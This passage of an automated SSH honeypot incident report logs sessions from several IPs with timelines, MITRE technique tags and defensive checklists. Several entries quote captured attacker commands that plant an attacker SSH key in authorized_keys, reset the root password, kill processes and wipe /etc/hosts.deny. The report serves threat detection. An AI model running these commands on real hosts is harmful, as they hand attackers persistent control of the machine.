| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:26:29` | `cowrie.session.connect` |
| `2026-04-15 05:26:29` | `cowrie.client.version` |
| `2026-04-15 05:26:29` | `cowrie.client.kex` |
| `2026-04-15 05:26:30` | `cowrie.login.success` |
| `2026-04-15 05:26:31` | `cowrie.session.params` |
| `2026-04-15 05:26:31` | `cowrie.command.input` |
| `2026-04-15 05:26:31` | `cowrie.command.failed` |
| `2026-04-15 05:26:31` | `cowrie.log.closed` |
| `2026-04-15 05:26:32` | `cowrie.session.params` |
| `2026-04-15 05:26:32` | `cowrie.command.input` |
| `2026-04-15 05:26:32` | `cowrie.session.file_download` |
| `2026-04-15 05:26:32` | `cowrie.log.closed` |
| `2026-04-15 05:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.51.208[.]158` to AbuseIPDB if not already reported
- [ ] Block `187.51.208[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aadbaad0b88a

| Field | Detail |
|---|---|
| **Source IP** | `187.51.208[.]158` |
| **First Seen** | 2026-04-15 05:26 |
| **Last Seen** | 2026-04-15 05:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:26:36` | `cowrie.session.connect` |
| `2026-04-15 05:26:36` | `cowrie.client.version` |
| `2026-04-15 05:26:36` | `cowrie.client.kex` |
| `2026-04-15 05:26:38` | `cowrie.login.success` |
| `2026-04-15 05:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.51.208[.]158` to AbuseIPDB if not already reported
- [ ] Block `187.51.208[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a0bc35feb28

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]36` |
| **First Seen** | 2026-04-15 05:26 |
| **Last Seen** | 2026-04-15 05:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:26:41` | `cowrie.session.connect` |
| `2026-04-15 05:26:41` | `cowrie.client.version` |
| `2026-04-15 05:26:41` | `cowrie.client.kex` |
| `2026-04-15 05:26:43` | `cowrie.login.success` |
| `2026-04-15 05:26:43` | `cowrie.session.params` |
| `2026-04-15 05:26:43` | `cowrie.command.input` |
| `2026-04-15 05:26:43` | `cowrie.command.failed` |
| `2026-04-15 05:26:43` | `cowrie.log.closed` |
| `2026-04-15 05:26:44` | `cowrie.session.params` |
| `2026-04-15 05:26:44` | `cowrie.command.input` |
| `2026-04-15 05:26:44` | `cowrie.session.file_download` |
| `2026-04-15 05:26:44` | `cowrie.log.closed` |
| `2026-04-15 05:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f4f9446c383

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]36` |
| **First Seen** | 2026-04-15 05:26 |
| **Last Seen** | 2026-04-15 05:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:26:50` | `cowrie.session.connect` |
| `2026-04-15 05:26:50` | `cowrie.client.version` |
| `2026-04-15 05:26:52` | `cowrie.client.kex` |
| `2026-04-15 05:26:53` | `cowrie.login.success` |
| `2026-04-15 05:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3d34a508254

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:27 |
| **Last Seen** | 2026-04-15 05:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:27:34` | `cowrie.session.connect` |
| `2026-04-15 05:27:34` | `cowrie.client.version` |
| `2026-04-15 05:27:35` | `cowrie.client.kex` |
| `2026-04-15 05:27:35` | `cowrie.login.success` |
| `2026-04-15 05:27:36` | `cowrie.session.params` |
| `2026-04-15 05:27:36` | `cowrie.command.input` |
| `2026-04-15 05:27:36` | `cowrie.command.failed` |
| `2026-04-15 05:27:36` | `cowrie.log.closed` |
| `2026-04-15 05:27:36` | `cowrie.session.params` |
| `2026-04-15 05:27:36` | `cowrie.command.input` |
| `2026-04-15 05:27:36` | `cowrie.session.file_download` |
| `2026-04-15 05:27:36` | `cowrie.log.closed` |
| `2026-04-15 05:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2de3c83b1e30

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:27 |
| **Last Seen** | 2026-04-15 05:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:27:38` | `cowrie.session.connect` |
| `2026-04-15 05:27:38` | `cowrie.client.version` |
| `2026-04-15 05:27:38` | `cowrie.client.kex` |
| `2026-04-15 05:27:39` | `cowrie.login.success` |
| `2026-04-15 05:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf0c5ccb340

| Field | Detail |
|---|---|
| **Source IP** | `106.37.72[.]234` |
| **First Seen** | 2026-04-15 05:30 |
| **Last Seen** | 2026-04-15 05:30 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0F9t6GiWdXCn"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:30:28` | `cowrie.session.connect` |
| `2026-04-15 05:30:28` | `cowrie.client.version` |
| `2026-04-15 05:30:28` | `cowrie.client.kex` |
| `2026-04-15 05:30:29` | `cowrie.login.success` |
| `2026-04-15 05:30:29` | `cowrie.session.params` |
| `2026-04-15 05:30:29` | `cowrie.command.input` |
| `2026-04-15 05:30:29` | `cowrie.command.failed` |
| `2026-04-15 05:30:29` | `cowrie.log.closed` |
| `2026-04-15 05:30:29` | `cowrie.session.params` |
| `2026-04-15 05:30:29` | `cowrie.command.input` |
| `2026-04-15 05:30:30` | `cowrie.session.file_download` |
| `2026-04-15 05:30:30` | `cowrie.log.closed` |
| `2026-04-15 05:30:42` | `cowrie.session.params` |
| `2026-04-15 05:30:42` | `cowrie.command.input` |
| `2026-04-15 05:30:42` | `cowrie.log.closed` |
| `2026-04-15 05:30:42` | `cowrie.session.params` |
| `2026-04-15 05:30:42` | `cowrie.command.input` |
| `2026-04-15 05:30:42` | `cowrie.log.closed` |
| `2026-04-15 05:30:43` | `cowrie.session.params` |
| `2026-04-15 05:30:43` | `cowrie.command.input` |
| `2026-04-15 05:30:43` | `cowrie.session.file_download` |
| `2026-04-15 05:30:43` | `cowrie.log.closed` |
| `2026-04-15 05:30:43` | `cowrie.session.params` |
| `2026-04-15 05:30:43` | `cowrie.command.input` |
| `2026-04-15 05:30:43` | `cowrie.log.closed` |
| `2026-04-15 05:30:44` | `cowrie.session.params` |
| `2026-04-15 05:30:44` | `cowrie.command.input` |
| `2026-04-15 05:30:44` | `cowrie.log.closed` |
| `2026-04-15 05:30:44` | `cowrie.session.params` |
| `2026-04-15 05:30:44` | `cowrie.command.input` |
| `2026-04-15 05:30:44` | `cowrie.command.input` |
| `2026-04-15 05:30:44` | `cowrie.log.closed` |
| `2026-04-15 05:30:45` | `cowrie.session.params` |
| `2026-04-15 05:30:45` | `cowrie.command.input` |
| `2026-04-15 05:30:45` | `cowrie.log.closed` |
| `2026-04-15 05:30:45` | `cowrie.session.params` |
| `2026-04-15 05:30:45` | `cowrie.command.input` |
| `2026-04-15 05:30:45` | `cowrie.log.closed` |
| `2026-04-15 05:30:46` | `cowrie.session.params` |
| `2026-04-15 05:30:46` | `cowrie.command.input` |
| `2026-04-15 05:30:46` | `cowrie.log.closed` |
| `2026-04-15 05:30:46` | `cowrie.session.params` |
| `2026-04-15 05:30:46` | `cowrie.command.input` |
| `2026-04-15 05:30:46` | `cowrie.log.closed` |
| `2026-04-15 05:30:47` | `cowrie.session.params` |
| `2026-04-15 05:30:47` | `cowrie.command.input` |
| `2026-04-15 05:30:47` | `cowrie.log.closed` |
| `2026-04-15 05:30:47` | `cowrie.session.params` |
| `2026-04-15 05:30:47` | `cowrie.command.input` |
| `2026-04-15 05:30:47` | `cowrie.log.closed` |
| `2026-04-15 05:30:48` | `cowrie.session.params` |
| `2026-04-15 05:30:48` | `cowrie.command.input` |
| `2026-04-15 05:30:48` | `cowrie.log.closed` |
| `2026-04-15 05:30:48` | `cowrie.session.params` |
| `2026-04-15 05:30:48` | `cowrie.command.input` |
| `2026-04-15 05:30:48` | `cowrie.log.closed` |
| `2026-04-15 05:30:49` | `cowrie.session.params` |
| `2026-04-15 05:30:49` | `cowrie.command.input` |
| `2026-04-15 05:30:49` | `cowrie.log.closed` |
| `2026-04-15 05:30:49` | `cowrie.session.params` |
| `2026-04-15 05:30:49` | `cowrie.command.input` |
| `2026-04-15 05:30:49` | `cowrie.log.closed` |
| `2026-04-15 05:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.37.72[.]234` to AbuseIPDB if not already reported
- [ ] Block `106.37.72[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84c3a5527a75

| Field | Detail |
|---|---|
| **Source IP** | `106.37.72[.]234` |
| **First Seen** | 2026-04-15 05:31 |
| **Last Seen** | 2026-04-15 05:34 |
| **Session Duration** | 191s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:rL6W4krLguKV"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:31:32` | `cowrie.session.connect` |
| `2026-04-15 05:31:32` | `cowrie.client.version` |
| `2026-04-15 05:31:33` | `cowrie.client.kex` |
| `2026-04-15 05:31:33` | `cowrie.login.success` |
| `2026-04-15 05:31:34` | `cowrie.session.params` |
| `2026-04-15 05:31:34` | `cowrie.command.input` |
| `2026-04-15 05:31:34` | `cowrie.command.failed` |
| `2026-04-15 05:31:34` | `cowrie.log.closed` |
| `2026-04-15 05:31:34` | `cowrie.session.params` |
| `2026-04-15 05:31:34` | `cowrie.command.input` |
| `2026-04-15 05:31:34` | `cowrie.session.file_download` |
| `2026-04-15 05:31:34` | `cowrie.log.closed` |
| `2026-04-15 05:31:42` | `cowrie.session.params` |
| `2026-04-15 05:31:42` | `cowrie.command.input` |
| `2026-04-15 05:31:43` | `cowrie.log.closed` |
| `2026-04-15 05:31:43` | `cowrie.session.params` |
| `2026-04-15 05:31:43` | `cowrie.command.input` |
| `2026-04-15 05:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.37.72[.]234` to AbuseIPDB if not already reported
- [ ] Block `106.37.72[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed0b240bd0b

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:31 |
| **Last Seen** | 2026-04-15 05:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:31:35` | `cowrie.session.connect` |
| `2026-04-15 05:31:35` | `cowrie.client.version` |
| `2026-04-15 05:31:35` | `cowrie.client.kex` |
| `2026-04-15 05:31:36` | `cowrie.login.success` |
| `2026-04-15 05:31:36` | `cowrie.session.params` |
| `2026-04-15 05:31:36` | `cowrie.command.input` |
| `2026-04-15 05:31:36` | `cowrie.command.failed` |
| `2026-04-15 05:31:36` | `cowrie.log.closed` |
| `2026-04-15 05:31:37` | `cowrie.session.params` |
| `2026-04-15 05:31:37` | `cowrie.command.input` |
| `2026-04-15 05:31:37` | `cowrie.session.file_download` |
| `2026-04-15 05:31:37` | `cowrie.log.closed` |
| `2026-04-15 05:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92430d3d6219

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:31 |
| **Last Seen** | 2026-04-15 05:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:31:39` | `cowrie.session.connect` |
| `2026-04-15 05:31:39` | `cowrie.client.version` |
| `2026-04-15 05:31:39` | `cowrie.client.kex` |
| `2026-04-15 05:31:40` | `cowrie.login.success` |
| `2026-04-15 05:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce72328978a

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:32 |
| **Last Seen** | 2026-04-15 05:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:32:57` | `cowrie.session.connect` |
| `2026-04-15 05:32:57` | `cowrie.client.version` |
| `2026-04-15 05:32:58` | `cowrie.client.kex` |
| `2026-04-15 05:32:58` | `cowrie.login.success` |
| `2026-04-15 05:32:58` | `cowrie.session.params` |
| `2026-04-15 05:32:58` | `cowrie.command.input` |
| `2026-04-15 05:32:58` | `cowrie.command.failed` |
| `2026-04-15 05:32:59` | `cowrie.log.closed` |
| `2026-04-15 05:32:59` | `cowrie.session.params` |
| `2026-04-15 05:32:59` | `cowrie.command.input` |
| `2026-04-15 05:32:59` | `cowrie.session.file_download` |
| `2026-04-15 05:32:59` | `cowrie.log.closed` |
| `2026-04-15 05:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06a021838fac

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:33 |
| **Last Seen** | 2026-04-15 05:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:33:01` | `cowrie.session.connect` |
| `2026-04-15 05:33:01` | `cowrie.client.version` |
| `2026-04-15 05:33:01` | `cowrie.client.kex` |
| `2026-04-15 05:33:02` | `cowrie.login.success` |
| `2026-04-15 05:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d0de89b1444

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]36` |
| **First Seen** | 2026-04-15 05:33 |
| **Last Seen** | 2026-04-15 05:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:33:28` | `cowrie.session.connect` |
| `2026-04-15 05:33:28` | `cowrie.client.version` |
| `2026-04-15 05:33:28` | `cowrie.client.kex` |
| `2026-04-15 05:33:29` | `cowrie.login.success` |
| `2026-04-15 05:33:30` | `cowrie.session.params` |
| `2026-04-15 05:33:30` | `cowrie.command.input` |
| `2026-04-15 05:33:30` | `cowrie.command.failed` |
| `2026-04-15 05:33:30` | `cowrie.log.closed` |
| `2026-04-15 05:33:30` | `cowrie.session.params` |
| `2026-04-15 05:33:30` | `cowrie.command.input` |
| `2026-04-15 05:33:31` | `cowrie.session.file_download` |
| `2026-04-15 05:33:31` | `cowrie.log.closed` |
| `2026-04-15 05:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3d7a31708c1

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]36` |
| **First Seen** | 2026-04-15 05:33 |
| **Last Seen** | 2026-04-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:33:35` | `cowrie.session.connect` |
| `2026-04-15 05:33:35` | `cowrie.client.version` |
| `2026-04-15 05:33:35` | `cowrie.client.kex` |
| `2026-04-15 05:33:36` | `cowrie.login.success` |
| `2026-04-15 05:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-679cde6e32f7

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]36` |
| **First Seen** | 2026-04-15 05:35 |
| **Last Seen** | 2026-04-15 05:35 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
